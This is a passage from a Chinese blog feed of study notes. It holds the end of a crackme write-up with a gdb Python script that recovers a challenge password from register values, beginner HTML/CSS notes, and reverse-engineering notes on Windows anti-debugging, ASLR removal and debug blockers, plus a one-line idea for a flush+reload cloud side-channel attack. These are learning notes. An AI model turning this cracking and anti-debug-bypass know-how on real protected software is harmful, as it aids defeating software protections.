gdb.execute(<span class="string">&#x27;info reg rdx&#x27;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">rdx = re.findall(<span class="string">&#x27;^rdx\s+\w+\s+(\d+)$&#x27;</span>, rdx)</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;&quot;</span> + <span class="built_in">chr</span>( <span class="built_in">int</span>(rdx[<span class="number">0</span>]) )</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  gdb.execute(<span class="string">&#x27;run &lt;&lt;&lt; &#x27;</span>+password)</span><br><span class="line">  <span class="comment"># Continue to last character</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> password:</span><br><span class="line">    gdb.execute(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    rdx = gdb.execute(<span class="string">&#x27;info reg rdx&#x27;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span> gdb.error:</span><br><span class="line">    <span class="comment"># If info reg fails it is probably because the program has exited.</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  rdx = re.findall(<span class="string">&#x27;^rdx\s+\w+\s+(\d+)$&#x27;</span>, rdx)</span><br><span class="line">  password += <span class="built_in">chr</span>( <span class="built_in">int</span>(rdx[<span class="number">0</span>]) )</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Password found is :&quot;</span>+password)</span><br><span class="line"></span><br><span class="line">gdb.execute(<span class="string">&#x27;quit&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="论文-想法"><a href="#论文-想法" class="headerlink" title="论文 想法"></a>论文 想法</h3><p>云攻击</p><p>让VM支持去重，然后flush+reload</p><p>建立cpu cache的随机策略<br>映射</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x64-Nanomites-Introduction-WP&quot;&gt;&lt;a href=&quot;#ELF-x64-Nanomites-Introduction-WP&quot; class=&quot;headerlink&quot; title=&quot;ELF x64 - Nanomites - Introduction_WP&quot;&gt;&lt;/a&gt;ELF x64 - Nanomites - Introduction_WP&lt;/h2&gt;&lt;p&gt;这是运用了&lt;code&gt;Debug Blocker&lt;/code&gt;技术的题目&lt;br&gt;又花了些时间，终于破解了&lt;/p&gt;
&lt;h3 id=&quot;gdb-设置跟踪父进程还是子进程&quot;&gt;&lt;a href=&quot;#gdb-设置跟踪父进程还是子进程&quot; class=&quot;headerlink&quot; title=&quot;gdb  设置跟踪父进程还是子进程&quot;&gt;&lt;/a&gt;gdb  设置跟踪父进程还是子进程&lt;/h3&gt;&lt;p&gt;&lt;code&gt;set follow-fork-mode parrent|child&lt;/code&gt;&lt;br&gt;当发生fork时，指示调试器执行父进程还是子进程&lt;/p&gt;
&lt;h3 id=&quot;ptrace&quot;&gt;&lt;a href=&quot;#ptrace&quot; class=&quot;headerlink&quot; title=&quot;ptrace&quot;&gt;&lt;/a&gt;ptrace&lt;/h3&gt;&lt;p&gt;在程序执行到&lt;code&gt;int3&lt;/code&gt;时，就会触发 &lt;code&gt;SIGTRAP &lt;/code&gt;信号，&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>前端学习_html_css_1</title>
    <link href="http://finsenty54.github.io/2020/10/29/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0_html_css_1/"/>
    <id>http://finsenty54.github.io/2020/10/29/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0_html_css_1/</id>
    <published>2020-10-29T13:10:00.000Z</published>
    <updated>2020-10-31T08:53:12.096Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前端学习"><a href="#前端学习" class="headerlink" title="前端学习"></a>前端学习</h2><h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><p><em>连接 80 端口需要管理员权限（非管理员用户只能监听大于 1024 的端口</em></p><p><em>流（stream）代表一个客户端和服务端之间打开的连接。</em></p><p>？闭包作为参数？</p><a id="more"></a><hr><h4 id=""><a href="#" class="headerlink" title=""></a><!DOCTYPE html></h4><p>— 文档类型。混沌初分，HTML 尚在襁褓（大约是 1991/92 年）之时，DOCTYPE 用来链接一些 HTML 编写守则，比如自动查错之类。DOCTYPE 在当今作用有限，仅用于保证文档正常读取。现在知道这些就足够了。</p><h4 id="html-1"><a href="#html-1" class="headerlink" title="html"></a>html</h4><p><code>&lt;html&gt;</code> 元素。<br>该元素包含整个页面的内容，也称作根元素。</p><h4 id="head"><a href="#head" class="headerlink" title="head"></a>head</h4><p><code>&lt;head&gt;</code>元素。该元素的内容对用户不可见，其中包含例如面向搜索引擎的搜索关键字（keywords）、页面描述、CSS 样式表和字符编码声明等。</p><p><code>&lt;meta charset=&quot;utf-8&quot;&gt; </code><br>该元素指定文档使用 UTF-8 字符编码 ，UTF-8 包括绝大多数人类已知语言的字符。基本上 UTF-8 可以处理任何文本内容，还可以避免以后出现某些问题，没有理由再选用其他编码。</p><p><code>&lt;title&gt; </code>元素。该元素设置页面的标题，显示在浏览器标签页上，也作为收藏网页的描述文字。</p><h4 id="body"><a href="#body" class="headerlink" title="body"></a>body</h4><p><code>&lt;body&gt; </code>元素。该元素包含期望让用户在访问页面时看到的内容，包括文本、图像、视频、游戏、可播放的音轨或其他内容。</p><h4 id="img"><a href="#img" class="headerlink" title="img"></a>img</h4><pre><code>&lt;img src=&quot;images/firefox-icon.png&quot; alt=&quot;测试图片&quot;&gt;</code></pre><p><code>alt</code>，是图像的描述内容 属性<br><code>src</code>也是属性，资源</p><h4 id="列表list"><a href="#列表list" class="headerlink" title="列表list"></a>列表list</h4><p>ul无序<br>ol有序<br>列表的每个项目用一个列表项目（List Item）元素 <code>&lt;li&gt;</code> 包围</p><pre><code>&lt;ul&gt;  无序列表  &lt;li&gt;技术人员&lt;/li&gt;  &lt;li&gt;思考者&lt;/li&gt;  &lt;li&gt;建造者&lt;/li&gt;&lt;/ul&gt;</code></pre><hr><p>####a<br>链接非常重要 — 它们赋予 Web 网络属性。要植入一个链接，我们需要使用一个简单的元素 — <code>&lt;a&gt;</code> — a 是 “anchor” （锚）的缩写</p><pre><code>&lt;a href=&quot;https://www.mozilla.org/zh-CN/about/manifesto/&quot;&gt;Mozilla 宣言&lt;/a&gt;</code></pre><p>href是属性</p><h4 id="测试本地文件"><a href="#测试本地文件" class="headerlink" title="测试本地文件"></a>测试本地文件</h4><p>它们具有服务端代码。 服务器端语言（如 PHP 或 Python）需要一个特殊的服务器来解释代码并提供结果。</p><p>层叠样式表（Cascading Style Sheet，简称：CSS）是为网页添加样式的代码<br>要选择一个 HTML 页面里所有的段落元素，然后将其中的文本改成红色，可以这样写 CSS<br>p {<br>  color: red;<br>}<br>再将该 CSS 文件连接至 HTML 文档，否则 CSS 代码不会对 HTML 文档在浏览器里的显示效果有任何影响</p><p>JavaScript（缩写：JS）是一门完备的 动态编程语言</p><p>对象：JavaScript 里一切皆对象，一切皆可储存在变量里。</p><p>例如disabled 属性，他们可以标记表单输入使之变为不可用(变灰色)，</p><p>实体引用： 在HTML中包含特殊字符</p><pre><code>&lt;    &amp;lt;&gt;    &amp;gt;&quot;    &amp;quot;&#39;    &amp;apos;&amp;    &amp;amp;</code></pre><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>HTML中的内容置为注释，你需要将其用特殊的记号<code>&lt;!--</code>和<code>--&gt;</code>包括起来</p><h4 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h4><p>许多<code>&lt;meta&gt; </code>元素包含了name 和 content 特性：</p><p>name 指定了meta 元素的类型； 说明该元素包含了什么类型的信息。<br>content 指定了实际的元数据内容。</p><hr><h4 id="span"><a href="#span" class="headerlink" title="span"></a>span</h4><p>在你的站点增加自定义图标<br>这是一个 <code>&lt;span&gt; </code>元素，它<code>没有语义</code>。当您想要对它用CSS（或者JS）时，您可以用它包裹内容，且不需要附加任何额外的意义</p><hr><h4 id="文字样式"><a href="#文字样式" class="headerlink" title="文字样式"></a>文字样式</h4><p>无序<code>&lt;ul&gt;</code><br>有序 Ordered<br><code>&lt;ol&gt;</code> 元素<br>将一个列表嵌入到另一个列表是完全可以的<br>用<code>&lt;em&gt;</code>（emphasis）元素来标记斜体<br><code>&lt;strong&gt; </code>加粗<br><code>&lt;i&gt; </code>被用来传达传统上用斜体表达的意义：外国文字，分类名称，技术术语，一种思想……<br><code>&lt;b&gt;</code> 被用来传达传统上用粗体表达的意义：关键字，产品名称，引导句……<br><code>&lt;u&gt;</code> 被用来传达传统上用下划线表达的意义：专有名词，拼写错误……<br>不要用</p><h4 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h4><pre><code>&lt;a href=&quot;https://www.mozilla.org/zh-CN/&quot;&gt;Mozilla 主页&lt;/a&gt;</code></pre><p>alt属性添加支持信息</p><pre><code>&lt;a href=&quot;https://www.mozilla.org/zh-CN/&quot;&gt;  &lt;img src=&quot;mozilla-image.png&quot; alt=&quot;链接至 Mozilla 主页的 Mozilla 标志&quot;&gt;&lt;/a&gt;</code></pre><p>可以有两个index.html文件，前提是他们在不同的目录下</p><p>指向上级目录： 如果你想在projects/index.html中包含一个指向pdfs/project-brief.pdf的超链接，你必须先返回上级目录，然后再回到pdf目录。“返回上一个目录级”使用两个英文点号表示 — <code>..</code> — 所以你应该使用的URL是<code> ../pdfs/project-brief.pdf</code></p><p>超链接除了可以链接到文档外，也可以链接到HTML文档的特定部分（被称为文档片段）。必须首先给要链接到的元素分配一个id属性</p><pre><code>&lt;a href=&quot;contacts.html#Mailing_address&quot;&gt;我们的地址&lt;/a&gt;&lt;a href=&quot;#Mailing_address&quot;&gt;</code></pre><p>当链接到同一网站的其他位置时，你应该使用相对链接（当链接到另一个网站时，你需要使用绝对链接<br>使用绝对URL时，浏览器首先通过DNS（见万维网是如何工作的）查找服务器的真实位置</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://download.mozilla.org/?product=firefox-latest-ssl&amp;os=win64&amp;lang=zh-CN&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">download</span>=<span class="string">&quot;firefox-latest-64bit-installer.exe&quot;</span>&gt;</span>  默认保存文件名</span><br></pre></td></tr></table></figure><hr><h4 id="网站结构"><a href="#网站结构" class="headerlink" title="网站结构"></a>网站结构</h4><p>创建网站的一种常见方式——每一页都使用相同的页面结构，包括相同的导航菜单</p><pre><code>&lt;a href=&quot;mailto:nowhere@mozilla.org&quot;&gt;向 nowhere 发邮件&lt;/a&gt;</code></pre><p>使用上标和下标。 <code>&lt;sup&gt;</code> 和<code>&lt;sub&gt;</code>元素可</p><pre><code>&lt;p&gt;如果 x&lt;sup&gt;2&lt;/sup&gt; 的值为 9，那么 x 的值必为 3 或 -3。&lt;/p&gt;</code></pre><p>为了实现语义化标记，HTML 提供了明确这些区段的专用标签，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>：页眉。</span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span>：导航栏。</span><br><span class="line"><span class="tag">&lt;<span class="name">main</span>&gt;</span>：主内容。主内容中还可以有各种子内容区段，可用<span class="tag">&lt;<span class="name">article</span>&gt;</span>、<span class="tag">&lt;<span class="name">section</span>&gt;</span> 和 <span class="tag">&lt;<span class="name">div</span>&gt;</span> 等元素表示。</span><br><span class="line"><span class="tag">&lt;<span class="name">aside</span>&gt;</span>：侧边栏，经常嵌套在 <span class="tag">&lt;<span class="name">main</span>&gt;</span> 中。</span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span>：页脚。</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span> 是一个内联的（inline）无语义元素，使用 class 属性提供一些标签，使这些元素能易于查询</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> 是一个块级无语义元素，应仅用于找不到更好的块级元素时，或者不想增加特定的意义时</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span> 可在段落中进行换行</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span> 元素在文档中生成一条水平分割线</span><br></pre></td></tr></table></figure><p><code>&lt;iframe&gt;</code><br>元素旨在允许您将其他Web文档嵌入到当前文档中</p><h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><p>给 HTML 元素加个类名（class），在 CSS 中再选中那个类名</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;special&quot;</span>&gt;</span></span><br><span class="line">css中</span><br><span class="line">.special &#123;</span><br><span class="line">  color: orange;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h4><p>重要：：选择嵌套在<code>&lt;li&gt;</code> 元素内的<code>&lt;em&gt;</code>我们可以使用一个称为包含选择符的选择器，它只是单纯地在两个选择器之间加上一个空格</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">li</span> <span class="selector-tag">em</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: rebeccapurple;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置直接出现在标题后面并且与标题具有相同层级的段落样式，为此需在两个选择器之间添加一个 + 号 (成为 相邻选择符)</p><p>根据状态确定样式</p><pre><code>a:linka:hoverarticle p span &#123; ... &#125;h1 + ul + p &#123; ... &#125;</code></pre><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> <span class="selector-tag">h1</span> + <span class="selector-tag">p</span> <span class="selector-class">.special</span> &#123;</span><br><span class="line">在&lt;body&gt;之内，紧接在&lt;h1&gt;后面的&lt;p&gt;元素的内部，类名为special。</span><br></pre></td></tr></table></figure><hr><h4 id="css属性"><a href="#css属性" class="headerlink" title="css属性"></a>css属性</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">font-size</span></span><br><span class="line"><span class="selector-tag">width</span></span><br><span class="line"><span class="selector-tag">background-color</span></span><br><span class="line"><span class="selector-tag">color</span></span><br><span class="line"><span class="selector-tag">border</span></span><br></pre></td></tr></table></figure><p><code>calc()</code>函数 进行简单计算<br><code>rotate()</code></p><hr><h4 id="额外样式表"><a href="#额外样式表" class="headerlink" title="额外样式表"></a>额外样式表</h4><p>将额外的样式表导入主CSS样式表，可以使用@import:<br><code>@import &#39;styles2.css&#39;;</code></p><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4><p>应用两条<code>同级别</code>的规则（相同规则）<br><code>理解为后面的规则覆盖前面的规则</code></p><p>有不同选择器对应相同的元素的时候需要使用哪个规则<br><code>一个元素选择器比类选择器的优先级更低会被其覆盖</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">千位： 如果声明在 <span class="selector-tag">style</span> 的属性（内联样式）则该位得一分。这样的声明没有选择器，所以它得分总是1000。</span><br><span class="line">百位： 选择器中包含<span class="selector-tag">ID</span>选择器则该位得一分。</span><br><span class="line">十位： 选择器中包含类选择器、属性选择器或者伪类则该位得一分。</span><br><span class="line">个位：选择器中包含元素、伪元素选择器则该位得一分。</span><br></pre></td></tr></table></figure><h4 id="class-id"><a href="#class-id" class="headerlink" title="class id"></a>class id</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;outer&quot; class=&quot;container&quot;&gt;</span><br><span class="line"><span class="selector-id">#outer</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>id 对应<code> #outer</code><br>class对应<code>.container</code></p><h4 id="盒子"><a href="#盒子" class="headerlink" title="盒子"></a>盒子</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">标题(&lt;<span class="selector-tag">h1</span>&gt;等)和段落(&lt;<span class="selector-tag">p</span>&gt;)默认情况下都是块级的盒子</span><br><span class="line">做链接的 &lt;<span class="selector-tag">a</span>&gt; 元素、 &lt;<span class="selector-tag">span</span>&gt;、 &lt;<span class="selector-tag">em</span>&gt; 以及 &lt;<span class="selector-tag">strong</span>&gt; 都是默认处于 <span class="selector-tag">inline</span> 状态的</span><br><span class="line">＜<span class="selector-tag">div</span>＞块级元素</span><br><span class="line">盒子<span class="selector-tag">display</span> 属性的设置，比如 <span class="selector-tag">inline</span> 或者 <span class="selector-tag">block</span> ，来控制盒子的外部显示类型</span><br><span class="line">在标准模型中，如果你给盒设置 <span class="selector-tag">width</span> 和 <span class="selector-tag">height</span>，实际设置的是 <span class="selector-tag">content</span> <span class="selector-tag">box</span></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/BJ5qkq"><img src="https://s1.ax1x.com/2020/10/29/BJ5qkq.jpg" alt="BJ5qkq.jpg"></a><br>替代盒模型，width就是盒的宽度，而不是content的宽度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line">*, *<span class="selector-pseudo">::before</span>, *<span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: inherit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有两个外边距相接的元素，这些外边距将合并为一个外边距，即最大的单个外边距的大小</p><hr><h4 id="inline-block"><a href="#inline-block" class="headerlink" title="inline-block"></a>inline-block</h4><p>元素使用 display: inline-block，实现我们需要的块级的部分效果：</p><p>设置width 和height 属性会生效。<br>padding, margin, 以及border 会推开其他元素。</p><hr><h4 id="背景图像"><a href="#背景图像" class="headerlink" title="背景图像"></a>背景图像</h4><p>默认情况下，大图不会缩小以适应方框，因此我们只能看到它的一个小角，而小图则是平铺以填充方框</p><p><code>background-repeat</code>属性用于控制图像的平铺行为</p><p><code>background-size</code>属性，它可以设置长度或百分比值，来调整图像的大小以适应背景</p><p>背景是指定他们如何滚动时，内容滚动。这是由<code>background-attachment</code>属性控制的</p><p><code>border-radius</code>属性和与方框的每个角相关的长边来实现方框的圆角</p><p><code>background-color:rgba(0,0,0,.5);</code><br>RGBA颜色　第四个值表示颜色的alpha通道，它控制<code>不透明度</code>。如果将这个值设置为0，它将使颜色完全透明<br>半透明的黑色背景颜色</p><h4 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">overflow</span>属性</span><br><span class="line"><span class="selector-tag">overflow</span>: <span class="selector-tag">hidden</span>　隐藏掉溢出</span><br><span class="line"><span class="selector-tag">overflow</span>: <span class="selector-tag">scroll</span>　你的浏览器总会显示滚动条</span><br><span class="line"><span class="selector-tag">overflow-x</span>　　　－ｙ</span><br><span class="line"><span class="selector-tag">overflow</span>: <span class="selector-tag">auto</span>　　</span><br></pre></td></tr></table></figure><h4 id="绝对长度单位"><a href="#绝对长度单位" class="headerlink" title="绝对长度单位"></a>绝对长度单位</h4><p><code>px    像素　＝1/96ｃｍ</code></p><h4 id="相对长度单位"><a href="#相对长度单位" class="headerlink" title="相对长度单位"></a>相对长度单位</h4><p><code>em</code>    在 font-size 中使用是相对于父元素的字体大小，在其他属性中使用是相对于自身的字体大小，如 width</p><p>总是想让它至少有个确定的高度，你应该给它设置一个min-height属性</p><h4 id="图片溢出"><a href="#图片溢出" class="headerlink" title="图片溢出"></a>图片溢出</h4><p>一张图片的max-width设为100%。<br><code>max－width:100%　　</code>指的是父容器宽度的百分数<br>技术是用来让图片可响应的，所以在更小的设备上浏览的时候，它们会合适地缩放，但会先加载大的图像，在缩放</p><p>主页cargo-generate</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前端学习&quot;&gt;&lt;a href=&quot;#前端学习&quot; class=&quot;headerlink&quot; title=&quot;前端学习&quot;&gt;&lt;/a&gt;前端学习&lt;/h2&gt;&lt;h3 id=&quot;html&quot;&gt;&lt;a href=&quot;#html&quot; class=&quot;headerlink&quot; title=&quot;html&quot;&gt;&lt;/a&gt;html&lt;/h3&gt;&lt;h4 id=&quot;小知识&quot;&gt;&lt;a href=&quot;#小知识&quot; class=&quot;headerlink&quot; title=&quot;小知识&quot;&gt;&lt;/a&gt;小知识&lt;/h4&gt;&lt;p&gt;&lt;em&gt;连接 80 端口需要管理员权限（非管理员用户只能监听大于 1024 的端口&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;流（stream）代表一个客户端和服务端之间打开的连接。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;？闭包作为参数？&lt;/p&gt;</summary>
    
    
    
    
    <category term="FRONT-END" scheme="http://finsenty54.github.io/tags/FRONT-END/"/>
    
  </entry>
  
  <entry>
    <title>nice try</title>
    <link href="http://finsenty54.github.io/2020/10/27/nice_try/"/>
    <id>http://finsenty54.github.io/2020/10/27/nice_try/</id>
    <published>2020-10-27T07:34:42.000Z</published>
    <updated>2020-10-31T08:53:12.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="lt-逆向工程-核心原理-gt-终结"><a href="#lt-逆向工程-核心原理-gt-终结" class="headerlink" title="&lt;逆向工程-核心原理&gt;终结"></a>&lt;逆向工程-核心原理&gt;终结</h2><p><strong>看了两三年，终于看完了，</strong><code>nice try </code>2020-10-27 15:20:20 星期二  :tw-1f4aa:</p><p><em>接下来的是阅读过程中的一些笔记</em></p><a id="more"></a><hr><h3 id="内核调试"><a href="#内核调试" class="headerlink" title="内核调试"></a>内核调试</h3><p>终端中输入 <code>bcdedit -debug on</code><br>开启内核调试模式</p><h3 id="WINDBG"><a href="#WINDBG" class="headerlink" title="WINDBG"></a>WINDBG</h3><pre><code>lkd&gt; u nt!ZwCreateFile L50</code></pre><p>查看createfile 代码<br>u 反汇编 u L10显示10行命令</p><p>db命令<br>d-display</p><hr><h3 id="删除ASLR功能"><a href="#删除ASLR功能" class="headerlink" title="删除ASLR功能"></a>删除ASLR功能</h3><p>将选择头中的DLL Characteristics中DYNAMIC_BASE标志删除即可</p><hr><h3 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h3><p>长用于反调试<br>类似于linux <code>ptrace() </code>函数</p><p>每当创建/终止进程的线程时会自动调用执行的函数。创建进程的主线程会先于EP代码，调用回调函数</p><p>在选择头中有TLS表地址，里面是tls结构体的地址，可能有多个结构体，<code>address of callbacks</code>成员指向tls函数地址</p><hr><h3 id="isDebuggerPersent"><a href="#isDebuggerPersent" class="headerlink" title="isDebuggerPersent()"></a>isDebuggerPersent()</h3><p>检查<code>peb.deingdebugged</code>值，<code>+02</code>处<br>判断是否处于调试</p><p><code>getmodulehandle()</code><br>获取进程imagebase</p><hr><h3 id="windbg-配置符号表"><a href="#windbg-配置符号表" class="headerlink" title="windbg 配置符号表"></a>windbg 配置符号表</h3><p>srv*<a href="https://msdl.microsoft.com/download/symbols">https://msdl.microsoft.com/download/symbols</a><br>通知 WinDbg 进行符号文件的初始查找和加载：<br>.reload<br>Lm 查看已加载模块</p><p><code>dt </code><br>displays information about a local variable, global variable or data type</p><p>dt _teb<br>dt _peb<br>dt _peb_ldr_data</p><hr><h3 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h3><p>模块=dll加载后，通过PEB.ldr 直接获取该模块的加载基地址</p><p><code>FS:[0]</code> TEB起始地址</p><p><code>FS:[30]</code> PEB起始地址</p><hr><h3 id="利用SEH机制的反调试技术"><a href="#利用SEH机制的反调试技术" class="headerlink" title="利用SEH机制的反调试技术"></a>利用SEH机制的反调试技术</h3><p>程序在正常运行和调试运行时表现出的行为动作是不同的<br>正常：程序自己处理<br>调试时：抛给调试器处理</p><p>通过<code>TEB.NtTib.ExceptionList </code>找到SEH链</p><pre><code>TEB.NtTib.ExceptionList =FS：[0]</code></pre><hr><p>结构体 构成链</p><pre><code>* next_seh* handler</code></pre><p>esp+c 即指向 pContext<br>seh函数参数第三个为<code>指向pContext的指针</code>，保存<code>线程寄存器值</code>，执行其他进程就会保存寄存器值。<br><code>*pContext+B8 </code>(32位下）为EIP值， <code>修改EIP</code>，改变执行流程<br>一样，通过<code>PEB.isdebuggerpersent()</code>API 取得beingDebugged值判断</p><hr><h3 id="保护器，压缩器"><a href="#保护器，压缩器" class="headerlink" title="保护器，压缩器"></a>保护器，压缩器</h3><p> 反调试–一个更简单，更好的方法：判断当前系统是否是为逆向分析专用系统</p><pre><code>findWindow() , createTOOLhelp32SnapsHOT(), GETcomputerName()</code></pre><h3 id="OllyDBG-view-seh-chain"><a href="#OllyDBG-view-seh-chain" class="headerlink" title="OllyDBG view-seh chain"></a>OllyDBG view-seh chain</h3><p><code>PEB.ImageBase</code> 保存进程的实际映射地址</p><h3 id="debug-blocker"><a href="#debug-blocker" class="headerlink" title="debug blocker"></a>debug blocker</h3><ol><li><p>被调试进程不能被其他进程调试</p></li><li><p>调试器操作被调试者的代码</p></li><li><p>调试器处理被调试进程中发生的异常</p></li></ol><h3 id="clbp"><a href="#clbp" class="headerlink" title="clbp"></a>clbp</h3><p>ollydgb的<code>条件记录断点</code><br>ctrl+G 将光标移到4011f0地址后，按shift+f4，打开设置CLBP对话框（条件断点）</p><p>detach 分离</p><pre><code>EB FE 无限循环</code></pre><p><code>DebugActiveProcessStop()</code><br>将被调试者从调试器中分离出来</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;lt-逆向工程-核心原理-gt-终结&quot;&gt;&lt;a href=&quot;#lt-逆向工程-核心原理-gt-终结&quot; class=&quot;headerlink&quot; title=&quot;&amp;lt;逆向工程-核心原理&amp;gt;终结&quot;&gt;&lt;/a&gt;&amp;lt;逆向工程-核心原理&amp;gt;终结&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;看了两三年，终于看完了，&lt;/strong&gt;&lt;code&gt;nice try &lt;/code&gt;2020-10-27 15:20:20 星期二  :tw-1f4aa:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;接下来的是阅读过程中的一些笔记&lt;/em&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>ELF_x64_Nanomites_Introduction</title>
    <link href="http://finsenty54.github.io/2020/10/26/ELF_x64_Nanomites_Introduction/"/>
    <id>http://finsenty54.github.io/2020/10/26/ELF_x64_Nanomites_Introduction/</id>
    <published>2020-10-26T02:08:58.000Z</published>
    <updated>2020-10-31T08:53:12.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x64-Nanomites-Introduction"><a href="#ELF-x64-Nanomites-Introduction" class="headerlink" title="ELF x64 - Nanomites - Introduction"></a>ELF x64 - Nanomites - Introduction</h2><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p><del>mmap只是在虚拟内存分配了地址空间，只有在第一次访问虚拟内存的时候才分配物理内存。</del></p><pre><code>void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code></pre><a id="more"></a><p>在虚拟地址空间中为所调用进程创建一个新的映射。开始地址为addr，长度为length<br>内核在靠近页边界的地方，尝试创建。如果已有映射在此，就不用addr，会返回新地址</p><p>The contents of a <code>file mapping </code>(as opposed to an anonymous mapping;<br>       see MAP_ANONYMOUS below), are initialized using <code>length bytes s</code>tarting<br>       at <code>offset </code>offset in the file (or other object) referred to by the<br>       <code>file descriptor</code> fd. </p><hr><p><code>prot</code>参数描述所需的内存保护</p><p> The <code>flags</code> argument determines whether updates to the mapping are<br>       visible to other processes mapping the same region, and whether<br>       updates are carried through to the underlying file.</p><p>mmap 在虚拟空间中开辟一段空间，当要读的时候，将文件内容加载进物理内存</p><hr><h3 id="memcpy"><a href="#memcpy" 